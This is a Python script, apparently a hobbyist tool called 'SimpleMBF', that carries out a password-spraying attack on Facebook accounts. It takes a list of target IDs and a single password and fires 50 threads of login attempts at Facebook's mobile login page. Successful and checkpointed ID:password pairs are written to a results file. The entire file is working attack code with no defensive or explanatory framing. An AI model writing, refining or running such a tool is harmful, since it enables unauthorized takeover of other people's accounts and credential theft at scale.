from multiprocessing.pool import ThreadPool
import urllib.parse, os, requests
os.system('clear')
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
y="\033[33m"
#banner
print("""%s
   _____            __    __  ______  ____
  / __(_)_ _  ___  / /__ /  |/  / _ )/ __/
 _\ \/ /  ' \/ _ \/ / -_) /|_/ / _  / _/
/___/_/_/_/_/ .__/_/\__/_/  /_/____/_/ %sv.2%s
           /_/ 		%sAuthor:KANG-NEWBIE%s
"""%(c,y,c,g,w))
cek=[]
tap=[]
def main(arg):
	try:
                url='https://mbasic.facebook.com/login.php'
                dt={'email':arg,'pass':pas,'login':'submit'}
                req=requests.post(url,data=dt)
#                data = urllib.parse.urlencode(dt)
#                data = data.encode('utf-8')
#                req = urllib.request.Request(url, data)
#                resp = urllib.request.urlopen(req)
                respData = req.content
                if 'save-device' in str(respData) or 'm_sess' in str(respData):
                        true='yeah'
                        live="[found] %s => %s"%(arg,pas)
                        tap.append(true)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        tulis="{}\n".format(live)
                        open('result/live.txt','a').write(tulis)
                        print("%s[%sfound%s]%s %s -> %s"%(c,g,c,w,arg,pas))
                elif 'checkpoint' in str(respData):
                        true='notbad'
                        cek.append(true)
                        CP="[checkpoint] %s => %s"%(arg,pas)
                        try:
                                os.mkdir('result')
                        except FileExistsError:
                                pass
                        wrt="{}\n".format(CP)
                        open('result/live.txt','a').write(wrt)
                        print("%s[%sCpoint%s]%s %s -> %s"%(c,y,c,w,arg,pas))
                else:
                        print("%s[%snot%s]%s %s"%(c,r,c,w,arg))
	except:
		pass

try:
        file=open(input("[in] Id List Target: ")).read().splitlines()
        pas=input("[in] Password to Crack: ")
except KeyboardInterrupt:
        exit("%s\n[!] Key interrupt: Exiting."%(r))
except EOFError:
        exit("%s\n[!] Key interrupt: Exiting."%(r))
except FileNotFoundError:
        exit("%s\n[!] File not found: Exiting."%(r))
print("\n%s[LIVE RESULT]:"%(c))

o=[]
for x in file:
    o.append(x)
p=ThreadPool(50)
p.map(main,o)

if 'yeah' in str(tap) or 'notbad' in str(cek):
        print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
        print("Live Results saved: result/live.txt")
